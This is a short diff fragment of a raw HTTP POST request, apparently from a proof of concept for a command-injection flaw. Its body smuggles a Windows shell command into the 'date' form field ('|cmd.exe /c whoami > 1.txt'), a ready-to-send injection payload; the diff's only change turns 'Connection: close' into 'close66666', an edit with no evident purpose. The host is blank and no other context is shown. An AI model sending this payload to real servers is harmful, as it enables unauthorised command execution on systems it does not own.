@@ -16,7 +16,7 @@ Host:
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
-Connection: close
+Connection: close66666
 Content-Type: application/x-www-form-urlencoded
 
 cloudKey=0x0&date=|cmd.exe+/c+whoami+>+1.txt&time=1
